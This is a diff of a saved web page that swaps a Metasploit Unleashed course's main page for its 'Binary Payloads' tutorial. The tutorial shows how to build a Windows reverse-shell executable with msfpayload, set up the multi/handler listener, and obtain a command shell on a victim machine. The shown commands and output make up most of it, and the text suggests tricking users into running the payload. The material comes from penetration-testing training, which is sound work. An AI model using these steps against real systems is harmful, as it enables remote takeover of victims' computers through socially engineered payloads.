@@ -2,7 +2,7 @@
 		<!DOCTYPE html>
 		<html xmlns="" xml:lang="en" lang="en" dir="ltr">
 		<head>
-			<title>Metasploit Unleashed</title>
+			<title>Binary Payloads - Metasploit Unleashed</title>
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/reset.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/style.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/main.css" />
@@ -25,10 +25,10 @@
 						
 						<div id="controls">
 									<ul>
-			<li id="ca-nstab-main" class="selected"><a href="Port_Scanners" title="View the content page [c]" accesskey="c">Page</a></li>
-			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Main_Page&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
-			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
-			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
+			<li id="ca-nstab-main" class="selected"><a href="Binary_Payloads" title="View the content page [c]" accesskey="c">Page</a></li>
+			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Binary_Payloads&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
+			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Binary_Payloads&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
+			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Binary_Payloads&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
 		</ul>
 							
 							<div class="portlet" id="p-personal">
@@ -57,36 +57,312 @@
 						<a id="top"></a>
 						
 						<div id="content">
-							<h1>Metasploit Unleashed</h1>
+							<h1>Binary Payloads</h1>
 						
 							<div id="siteSub">From Metasploit Unleashed</div>
 							<div id="contentSub"></div>
-																													<div id="jump-to-nav">Jump to: <a href="Port_Scanners#column-one">navigation</a>, <a href="Port_Scanners#searchInput">search</a></div>
+																													<div id="jump-to-nav">Jump to: <a href="Binary_Payloads#column-one">navigation</a>, <a href="Binary_Payloads#searchInput">search</a></div>
 														<!-- start content -->
-							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>This free information security training is brought to you in a community effort to promote awareness and raise funds for underprivileged children in East Africa. Through a heart-warming effort by several security professionals, we are proud to present the most complete and in-depth open course about the Metasploit Framework.
+							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>It seems like Metasploit is full of interesting and useful features. One of these is the ability to generate an executable from a Metasploit payload. This can be very useful in situations such as social engineering, if you can get a user to run your payload for you, there is no reason to go through the trouble of exploiting any software.
 <br />
+<br />
+Let's look at a quick example of how to do this. We will generate a reverse shell payload, execute it on a remote system, and get our shell. To do this we will use the command line tool msfpayload. This command can be used for generating payloads to be used in many locations and offers a variety of output options, from perl to C to raw. We are interested in the executable output, which is provided by the X command.
+<br />
+<br />
+We'll generate a Windows reverse shell executable that will connect back to us on port 31337.  Notice that msfpayload operates the same way as msfcli in that you can append the letter 'O' to the end of the command string to see which options are available to you.
+<br />
+<br />
+<pre><span style='color:#ff0000;'>root@kali</span>:# <span style='color:#13C16A;'>msfpayload windows/shell_reverse_tcp O</span>
+
+       Name: Windows Command Shell, Reverse TCP Inline
+    Version: 6479
+   Platform: Windows
+       Arch: x86
+Needs Admin: No
+ Total size: 287
+
+Provided by:
+  vlad902 vlad902@gmail.com
+
+Basic options:
+Name       Current Setting  Required  Description
+----       ---------------  --------  -----------
+EXITFUNC   seh              yes       Exit technique: seh, thread, process
+LHOST                       yes       The local address
+LPORT      4444             yes       The local port
+
+Description:
+Connect back to attacker and spawn a command shell</pre>
+</p><p><pre><span style='color:#ff0000;'>root@kali</span>:# <span style='color:#13C16A;'>msfpayload windows/shell_reverse_tcp LHOST=172.16.104.130 LPORT=31337 O</span>
+
+Name: Windows Command Shell, Reverse TCP Inline
+Version: 6479
+Platform: Windows
+Arch: x86
+Needs Admin: No
+Total size: 287
+
+Provided by:
+vlad902 vlad902@gmail.com
+
+Basic options:
+Name       Current Setting  Required  Description
+----       ---------------  --------  -----------
+EXITFUNC   seh              yes       Exit technique: seh, thread, process
+LHOST      172.16.104.130   yes       The local address
+LPORT      31337            yes       The local port
+
+Description:
+Connect back to attacker and spawn a command shell</pre>
+</p><p><pre><span style='color:#ff0000;'>root@kali</span>:# <span style='color:#13C16A;'>msfpayload windows/shell_reverse_tcp LHOST=172.16.104.130 LPORT=31337 X > /tmp/1.exe</span>
+
+Created by msfpayload (http://www.metasploit.com).
+Payload: windows/shell_reverse_tcp
+Length: 287
+Options: LHOST=172.16.104.130,LPORT=31337
+
+root@kali:/pentest/exploits/framework3# <span style='color:#13C16A;'>file /tmp/1.exe</span>
+
+/tmp/1.exe: MS-DOS executable PE for MS Windows (GUI) Intel 80386 32-bit</pre>
+<br />
+Ok, now we see we have a windows executable ready to go. Now, we will use 'multi/handler'  which is a stub that handles exploits launched outside of the framework.
+<br />
+<br />
+<pre><span style='color:#ff0000;'>root@kali</span>:# <span style='color:#13C16A;'>msfconsole</span>
+
+  <span style='color:#00ffff;'>              ##                          ###           ##    ##
+ ##  ##  #### ###### ####  #####   #####    ##    ####        ######
+####### ##  ##  ##  ##         ## ##  ##    ##   ##  ##   ###   ##
+####### ######  ##  #####   ####  ##  ##    ##   ##  ##   ##    ##
+## # ##     ##  ##  ##  ## ##      #####    ##   ##  ##   ##    ##
+##   ##  #### ###   #####   #####     ##   ####   ####   #### ###
+                                      ##</span>
+
+
+       =[ metasploit v4.2.0-dev [core:4.2 api:1.0]
++ -- --=[ 787 exploits - 425 auxiliary - 128 post
++ -- --=[ 238 payloads - 27 encoders - 8 nops
+       =[ svn r14551 updated yesterday (2012.01.14)
+
+
+msf > <span style='color:#13C16A;'>use exploit/multi/handler</span>
+msf exploit(<span style='color:#ff0000;'>handler</span>) > <span style='color:#13C16A;'>show options</span>
+
+Module options:
+
+   Name  Current Setting  Required  Description 
+   ----  ---------------  --------  ----------- 
+
+
+Exploit target:
+
+   Id  Name            
+   --  ----            
+   0   Wildcard Target</pre>
+<br />
+When using the 'exploit/multi/handler' module, we still need to tell it which payload to expect so we configure it to have the same settings as the executable we generated.
+<br />
+<br />
+<pre>msf exploit(<span style='color:#ff0000;'>handler</span>) > <span style='color:#13C16A;'>set payload windows/shell/reverse_tcp</span>
+payload => windows/shell/reverse_tcp
+msf exploit(<span style='color:#ff0000;'>handler</span>) > <span style='color:#13C16A;'>show options</span>
+
+Module options:
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (windows/shell/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique: seh, thread, process
+   LHOST                      yes       The local address
+   LPORT     4444             yes       The local port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target 
+
+
+msf exploit(<span style='color:#ff0000;'>handler</span>) > <span style='color:#13C16A;'>set LHOST 172.16.104.130</span>
+LHOST => 172.16.104.130
+msf exploit(<span style='color:#ff0000;'>handler</span>) > <span style='color:#13C16A;'>set LPORT 31337</span>
+LPORT => 31337
+msf exploit(<span style='color:#ff0000;'>handler</span>) ></pre>
+<br />
+Now that we have everything set up and ready to go, we run 'exploit' for the multi/handler and execute our generated executable on the victim. The multi/handler handles the exploit for us and presents us our shell.
+<br />
+<br />
+<pre>msf exploit(<span style='color:#ff0000;'>handler</span>) > <span style='color:#13C16A;'>exploit</span>
+
+<span style='color:#0000FF;'>[*]</span> Handler binding to LHOST 0.0.0.0
+<span style='color:#0000FF;'>[*]</span> Started reverse handler
+<span style='color:#0000FF;'>[*]</span> Starting the payload handler...
+<span style='color:#0000FF;'>[*]</span> Sending stage (474 bytes)
+<span style='color:#0000FF;'>[*]</span> Command shell session 2 opened (172.16.104.130:31337 -> 172.16.104.128:1150)
+
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\Documents and Settings\Jim\My Documents></pre>
 <br />
 </p>
-<div class="center"><div class="floatnone"><a href="File:Msfu_logo_3.png" class="image"><img alt="Msfu logo 3.png" src="http://www.offensive-security.com/w/images/f/f6/Msfu_logo_3.png" width="632" height="319" /></a></div></div>
+<hr />
 <p><br />
-<br />
-This is a free online course and if you enjoy it and find it useful, we ask that you make a donation to the HFC (Hackers For Charity), $9.00 will feed a child for a month, so any contribution is welcome. We hope you enjoy this course as much as we enjoyed making it.
-<br />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total1"><a href="Client_Side_Attacks" title="Client Side Attacks">Client Side Attacks</a> &gt; Binary Payloads</div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total2"><strong class="selflink">Binary Payloads</strong> &#124; <a href="Client_Side_Exploits" title="Client Side Exploits">Client Side Exploits</a> &#124; <a href="VBScript_Infection_Methods" title="VBScript Infection Methods">VBScript Infection Methods</a></div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total3"><a href="Binary_Linux_Trojan" title="Binary Linux Trojan">Binary Linux Trojan</a></div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 </p>
 <!-- 
 NewPP limit report
-Preprocessor visited node count: 6/1000000
-Preprocessor generated node count: 20/1000000
-Post‐expand include size: 0/2097152 bytes
+Preprocessor visited node count: 520/1000000
+Preprocessor generated node count: 2719/1000000
+Post‐expand include size: 3720/2097152 bytes
 Template argument size: 0/2097152 bytes
-Highest expansion depth: 2/40
+Highest expansion depth: 3/40
 Expensive parser function count: 0/100
 -->
 
-<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:285-0!*!*!*!*!2!* and timestamp 20131123153816 -->
+<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:51-0!*!0!*!*!*!* and timestamp 20131124023659 -->
 </div><div class="printfooter">
-Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597">http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597</a>"</div>
-							<div id='catlinks' class='catlinks catlinks-allhidden'></div>							<!-- end content -->
+Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Binary_Payloads&amp;oldid=1525">http://www.offensive-security.com/w/index.php?title=Binary_Payloads&amp;oldid=1525</a>"</div>
+							<div id='catlinks' class='catlinks'><div id="mw-normal-catlinks" class="mw-normal-catlinks"><a href="Special:Categories" title="Special:Categories">Category</a>: <ul><li><a href="http://www.offensive-security.com/w/index.php?title=Category:Client_Side_Attacks&amp;action=edit&amp;redlink=1" class="new" title="Category:Client Side Attacks (page does not exist)">Client Side Attacks</a></li></ul></div></div>							<!-- end content -->
 													</div>
 						
 					</div>
@@ -521,4 +797,4 @@ document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.
 <script type="text/javascript">
 var pageTracker = _gat._getTracker("UA-1981501-1");
 pageTracker._trackPageview();
-</script><!-- Served in 0.151 secs. --></body></html>
+</script><!-- Served in 0.152 secs. --></body></html>
